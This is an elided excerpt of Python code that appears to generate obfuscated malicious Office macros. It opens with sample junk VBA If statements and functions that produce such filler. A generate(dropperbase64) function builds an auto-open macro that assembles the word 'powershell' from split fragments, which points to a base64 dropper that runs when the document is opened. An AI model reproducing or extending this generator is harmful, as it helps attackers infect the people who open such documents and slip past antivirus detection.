...
'''
   If u_1_6__5 Or A_386_81 Then
P_66__ = (693190117 - Rnd(p_7__7_9)) + 204851600 / Log(K065_77 / Atn(808127330) * 227733637 * CLng(610135505)) * H0810__ - Hex(693757713 - d029261_) - 184460838 / 296912602
End If
   If j__92435 Or f9_8_8_1 Then
Y0_5_811 = (981624201 - Rnd(v__4__64)) + 234133308 / Log(o_5_39_ / Atn(48237795) * 361572686 * CLng(872545730)) * L118_0 - Hex(196518534 - c2___4) - 130978200 / 783309032
End If
   If s043___ Or c_58_28 Then
z_447__ = (538759157 - Rnd(F881_8)) + 273894546 / Log(b_25_66 / Atn(311355266) * 156517645 * CLng(689524487)) * l11795 - Hex(628904805 - K720_1) - 44233998 / 705726093
End If
'''

def generate_nonsense_if_statement():
    case_vba = "\tIf {} Or {} Then\r\n".format(get_new_variable_name(), get_new_variable_name()) + \
                "{} = ({} - Rnd({})) + {} / Log({} / Atn({}) * {} * CLng({})) * {} - Hex({} - {}) - {} / {}\r\n".format(
                    get_new_variable_name(),  # initial var
                    str(random.randint(3000000, 999999999)),
...
def get_cases(min, max):
    ...
    while case_counter < cases_to_insert:
        return_vba = return_vba + generate_nonsense_if_statement()
...
def generate_nonsense_function():
    ...
    while case_count < number_of_cases:
        function_vba = function_vba + generate_nonsense_if_statement()
...
def generate(dropperbase64):
    ...
    # q3932__ (J_191___ + "po" + z4280000 + "wers" + q6_1__ + J8_4038 + z7___66_ + P7_7_4 + d_21_5 + f6177686),
    # (C75_6739 + n4242_8_ + d__86__)

    auto_open_vba = auto_open_vba + "{} ({} + \"po\" + {} + \"wers\" + {}), ({} + {} + {} + {})\r\n".format(
        reassembly_function_name,
        get_new_variable_name(),
        get_new_variable_name(),
